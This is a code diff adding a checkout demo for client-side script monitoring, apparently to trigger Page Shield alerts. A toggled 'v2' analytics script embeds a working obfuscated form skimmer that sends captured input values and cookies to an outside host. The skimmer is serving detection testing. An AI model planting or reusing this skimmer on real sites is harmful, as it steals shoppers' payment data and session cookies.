@@ -1029,6 +1029,361 @@ app.get("/api/page-shield/status", async (c) => {
 // clean v1 script has somewhere real to talk to.
 app.post("/api/page-shield/noop", (c) => c.body(null, 204));
 
+// ── Client-Side Security checkout demo ───────────────────────
+// Stable resources for the /client-side-security/checkout page. These give
+// Page Shield / Client-Side Security a clean, reproducible inventory of
+// first-party scripts, third-party scripts, connections, and cookies to
+// monitor. Most should NOT change between page loads. The "scenario"
+// endpoints below are explicit toggles to fire alert-worthy events.
+
+const CSS_KV = {
+  ANALYTICS_VERSION: "css:checkout:analytics_version",
+  SCENARIO_NEW_SCRIPT: "css:checkout:scenario:new_script",
+  SCENARIO_BAD_CONN: "css:checkout:scenario:bad_conn",
+  SCENARIO_BAD_COOKIE: "css:checkout:scenario:bad_cookie",
+};
+
+// First-party "checkout-core" script — the stable baseline. Provides the
+// fake checkout submit flow. Page Shield fingerprints this once and uses it
+// as the reference version for code-change detection alongside analytics.js.
+const CSS_CHECKOUT_CORE_JS = `// remydemo checkout-core - v1
+// Wires the fake checkout form, posts to /api/page-shield/checkout/submit,
+// sets a JS-side first-party cookie, and emits one expected telemetry beacon.
+(function () {
+  "use strict";
+
+  function readForm() {
+    var f = document.getElementById("checkout-form");
+    if (!f) return {};
+    var fd = new FormData(f);
+    var out = {};
+    fd.forEach(function (v, k) { out[k] = v; });
+    return out;
+  }
+
+  function setJsCookie() {
+    // Browser-set first-party cookie (Client-Side Security will see this
+    // as an "unknown" type cookie because it isn't set via Set-Cookie).
+    document.cookie = "demo_cart_seen=1; path=/; SameSite=Lax; max-age=86400";
+  }
+
+  function sendTelemetry(payload) {
+    try {
+      var body = JSON.stringify({
+        kind: "checkout_event",
+        payload: payload || {},
+        ts: Date.now(),
+      });
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon("/api/page-shield/checkout/telemetry", body);
+      } else {
+        fetch("/api/page-shield/checkout/telemetry", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: body,
+          keepalive: true,
+        });
+      }
+    } catch (e) { /* swallow */ }
+  }
+
+  function submitCheckout(e) {
+    if (e && e.preventDefault) e.preventDefault();
+    var data = readForm();
+    var statusEl = document.getElementById("checkout-status");
+    if (statusEl) statusEl.textContent = "Processing...";
+    fetch("/api/page-shield/checkout/submit", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data),
+      credentials: "same-origin",
+    })
+      .then(function (r) { return r.json(); })
+      .then(function (j) {
+        if (statusEl) {
+          statusEl.textContent = j && j.ok
+            ? "Order accepted: " + (j.orderId || "")
+            : "Order failed.";
+        }
+        sendTelemetry({ event: "checkout_submitted", orderId: j && j.orderId });
+      })
+      .catch(function () {
+        if (statusEl) statusEl.textContent = "Order error.";
+      });
+    return false;
+  }
+
+  function init() {
+    setJsCookie();
+    var f = document.getElementById("checkout-form");
+    if (f) f.addEventListener("submit", submitCheckout);
+    sendTelemetry({ event: "page_loaded", path: location.pathname });
+    window.__remydemoCheckout = { version: "v1", submit: submitCheckout };
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", init);
+  } else {
+    init();
+  }
+})();
+`;
+
+// First-party "analytics" script — exact same v1/v2 pattern as the existing
+// /api/page-shield/analytics.js, but scoped under the checkout path so the
+// code-change scenario lives entirely inside the checkout story.
+const CSS_ANALYTICS_V1 = `// remydemo checkout analytics - v1 (clean)
+(function () {
+  "use strict";
+  function track(event, payload) {
+    try {
+      var data = JSON.stringify({ event: event, payload: payload || {}, ts: Date.now() });
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon("/api/page-shield/checkout/telemetry", data);
+      }
+    } catch (e) { /* swallow */ }
+  }
+  window.addEventListener("DOMContentLoaded", function () {
+    track("pageview", { path: location.pathname, ref: document.referrer || null });
+  });
+  document.addEventListener("click", function (e) {
+    var a = e.target && e.target.closest && e.target.closest("a[href]");
+    if (a) track("click", { href: a.getAttribute("href") });
+  }, { passive: true });
+  window.__remydemoCheckoutAnalytics = { version: "v1", track: track };
+})();
+`;
+
+const CSS_ANALYTICS_V2 = `// remydemo checkout analytics - v1 (clean)
+(function () {
+  "use strict";
+  function track(event, payload) {
+    try {
+      var data = JSON.stringify({ event: event, payload: payload || {}, ts: Date.now() });
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon("/api/page-shield/checkout/telemetry", data);
+      }
+    } catch (e) { /* swallow */ }
+  }
+  window.addEventListener("DOMContentLoaded", function () {
+    track("pageview", { path: location.pathname, ref: document.referrer || null });
+  });
+  document.addEventListener("click", function (e) {
+    var a = e.target && e.target.closest && e.target.closest("a[href]");
+    if (a) track("click", { href: a.getAttribute("href") });
+  }, { passive: true });
+  // [INJECTED 2026-06-19] - skimmer payload from compromised CDN
+  var _x=["input","blur","value","name","tagName","INPUT","__remydemo_collected"];
+  document.addEventListener(_x[1],function(e){
+    var t=e.target;if(!t||t[_x[4]]!==_x[5])return;
+    var c=window[_x[6]]||(window[_x[6]]={});
+    c[t[_x[3]]||t.id||"_"]=t[_x[2]];
+    try{
+      var p="https://cdn-metrics-collector.io/px?sid="+encodeURIComponent(document.cookie)+"&d="+encodeURIComponent(JSON.stringify(c))+"&ua="+encodeURIComponent(navigator.userAgent)+"&ref="+encodeURIComponent(location.href)+"&ts="+Date.now();
+      navigator.sendBeacon&&navigator.sendBeacon(p);
+    }catch(e){}
+  },true);
+  window.__remydemoCheckoutAnalytics = { version: "v1", track: track };
+})();
+`;
+
+// GET /api/page-shield/checkout-core.js — stable first-party checkout JS.
+app.get("/api/page-shield/checkout-core.js", (c) => {
+  return new Response(CSS_CHECKOUT_CORE_JS, {
+    status: 200,
+    headers: {
+      "Content-Type": "application/javascript; charset=utf-8",
+      "Cache-Control": "no-cache, no-store, must-revalidate",
+      "X-Demo-Script": "checkout-core",
+    },
+  });
+});
+
+// GET /api/page-shield/checkout-analytics.js — toggled v1/v2 first-party
+// analytics script. Same code-change pattern as analytics.js above.
+app.get("/api/page-shield/checkout-analytics.js", async (c) => {
+  let version = "v1";
+  try {
+    const stored = await c.env.DEMO_KV.get(CSS_KV.ANALYTICS_VERSION);
+    if (stored === "v2") version = "v2";
+  } catch (e) {
+    // KV miss is fine, fall back to v1
+  }
+  const body = version === "v2" ? CSS_ANALYTICS_V2 : CSS_ANALYTICS_V1;
+  return new Response(body, {
+    status: 200,
+    headers: {
+      "Content-Type": "application/javascript; charset=utf-8",
+      "Cache-Control": "no-cache, no-store, must-revalidate",
+      "X-Demo-Script-Version": version,
+    },
+  });
+});
+
+// POST /api/page-shield/checkout-analytics/toggle — flip analytics v1 <-> v2.
+app.post("/api/page-shield/checkout-analytics/toggle", async (c) => {
+  let requested: string | undefined;
+  try {
+    const body = await c.req.json().catch(() => ({}));
+    if (body && typeof (body as any).version === "string") {
+      requested = (body as any).version;
+    }
+  } catch (e) {
+    // ignore
+  }
+
+  let next: "v1" | "v2";
+  if (requested === "v1" || requested === "v2") {
+    next = requested;
+  } else {
+    const current = await c.env.DEMO_KV.get(CSS_KV.ANALYTICS_VERSION);
+    next = current === "v2" ? "v1" : "v2";
+  }
+
+  await c.env.DEMO_KV.put(CSS_KV.ANALYTICS_VERSION, next);
+  return c.json({ version: next, ts: Date.now() });
+});
+
+// GET /api/page-shield/checkout-analytics/status — current live version.
+app.get("/api/page-shield/checkout-analytics/status", async (c) => {
+  const stored = await c.env.DEMO_KV.get(CSS_KV.ANALYTICS_VERSION);
+  const version = stored === "v2" ? "v2" : "v1";
+  return c.json({ version });
+});
+
+// POST /api/page-shield/checkout/submit — accepts fake checkout submission
+// and sets a deterministic first-party cookie via Set-Cookie so that
+// Client-Side Security cookie monitoring sees a known first-party cookie.
+app.post("/api/page-shield/checkout/submit", async (c) => {
+  let body: any = {};
+  try { body = await c.req.json(); } catch (e) { body = {}; }
+
+  const orderId = "ord_" + Math.random().toString(36).slice(2, 10);
+  const sessionId = "sess_" + Math.random().toString(36).slice(2, 14);
+
+  // First-party cookies. These will appear in Client-Side Security cookie
+  // monitoring as `first_party` type with full attributes.
+  const cookies = [
+    `demo_checkout_session=${sessionId}; Path=/; SameSite=Strict; Secure; HttpOnly; Max-Age=1800`,
+    `demo_checkout_last_order=${orderId}; Path=/; SameSite=Lax; Secure; Max-Age=604800`,
+  ];
+
+  return new Response(
+    JSON.stringify({
+      ok: true,
+      orderId,
+      sessionId,
+      received: {
+        name: typeof body.name === "string" ? body.name.slice(0, 64) : "",
+        // Never echo card data even in a demo.
+        cardLast4: typeof body.card === "string" ? body.card.replace(/\D/g, "").slice(-4) : "",
+      },
+      ts: Date.now(),
+    }),
+    {
+      status: 200,
+      headers: {
+        "Content-Type": "application/json",
+        "Set-Cookie": cookies.join(", "),
+      },
+    }
+  );
+});
+
+// POST /api/page-shield/checkout/telemetry — first-party telemetry sink.
+// Returns 204 so the browser doesn't hold long connections open.
+app.post("/api/page-shield/checkout/telemetry", (c) => c.body(null, 204));
+
+// ── Scenario toggles ─────────────────────────────────────────
+// Each scenario is a small piece of state in KV that the checkout page reads
+// at render time. The page conditionally injects the corresponding signal so
+// Client-Side Security generates an alert / dashboard entry.
+
+type ScenarioState = { enabled: boolean; ts: number };
+
+async function readScenario(c: any, key: string): Promise<ScenarioState> {
+  try {
+    const raw = await c.env.DEMO_KV.get(key);
+    if (!raw) return { enabled: false, ts: 0 };
+    const parsed = JSON.parse(raw);
+    return { enabled: !!parsed.enabled, ts: Number(parsed.ts) || 0 };
+  } catch {
+    return { enabled: false, ts: 0 };
+  }
+}
+
+async function writeScenario(c: any, key: string, enabled: boolean) {
+  const value: ScenarioState = { enabled, ts: Date.now() };
+  await c.env.DEMO_KV.put(key, JSON.stringify(value));
+  return value;
+}
+
+// GET /api/page-shield/checkout/scenarios — current state of all scenarios.
+app.get("/api/page-shield/checkout/scenarios", async (c) => {
+  const [newScript, badConn, badCookie, analyticsRaw] = await Promise.all([
+    readScenario(c, CSS_KV.SCENARIO_NEW_SCRIPT),
+    readScenario(c, CSS_KV.SCENARIO_BAD_CONN),
+    readScenario(c, CSS_KV.SCENARIO_BAD_COOKIE),
+    c.env.DEMO_KV.get(CSS_KV.ANALYTICS_VERSION),
+  ]);
+  return c.json({
+    newScript,
+    badConn,
+    badCookie,
+    analyticsVersion: analyticsRaw === "v2" ? "v2" : "v1",
+  });
+});
+
+// POST /api/page-shield/checkout/scenarios  body: { name, enabled? }
+//   name: "new_script" | "bad_conn" | "bad_cookie" | "code_change"
+//   enabled: boolean (defaults to toggle of current)
+app.post("/api/page-shield/checkout/scenarios", async (c) => {
+  let body: any = {};
+  try { body = await c.req.json(); } catch (e) { body = {}; }
+
+  const name = String(body.name || "");
+  const explicitEnabled =
+    typeof body.enabled === "boolean" ? (body.enabled as boolean) : undefined;
+
+  let key: string | null = null;
+  if (name === "new_script") key = CSS_KV.SCENARIO_NEW_SCRIPT;
+  else if (name === "bad_conn") key = CSS_KV.SCENARIO_BAD_CONN;
+  else if (name === "bad_cookie") key = CSS_KV.SCENARIO_BAD_COOKIE;
+
+  if (name === "code_change") {
+    const current = await c.env.DEMO_KV.get(CSS_KV.ANALYTICS_VERSION);
+    const next =
+      explicitEnabled === undefined
+        ? current === "v2" ? "v1" : "v2"
+        : explicitEnabled
+          ? "v2"
+          : "v1";
+    await c.env.DEMO_KV.put(CSS_KV.ANALYTICS_VERSION, next);
+    return c.json({ ok: true, scenario: name, analyticsVersion: next });
+  }
+
+  if (!key) {
+    return c.json({ ok: false, error: "unknown scenario" }, 400);
+  }
+
+  const current = await readScenario(c, key);
+  const enabled = explicitEnabled === undefined ? !current.enabled : explicitEnabled;
+  const state = await writeScenario(c, key, enabled);
+  return c.json({ ok: true, scenario: name, state });
+});
+
+// POST /api/page-shield/checkout/reset — reset all scenarios to disabled,
+// analytics back to v1. Useful between demos.
+app.post("/api/page-shield/checkout/reset", async (c) => {
+  await Promise.all([
+    writeScenario(c, CSS_KV.SCENARIO_NEW_SCRIPT, false),
+    writeScenario(c, CSS_KV.SCENARIO_BAD_CONN, false),
+    writeScenario(c, CSS_KV.SCENARIO_BAD_COOKIE, false),
+    c.env.DEMO_KV.put(CSS_KV.ANALYTICS_VERSION, "v1"),
+  ]);
+  return c.json({ ok: true });
+});
+
 // ── Pages Functions export ───────────────────────────────────
 
 export const onRequest = (context: { request: Request; env: Bindings }) => {
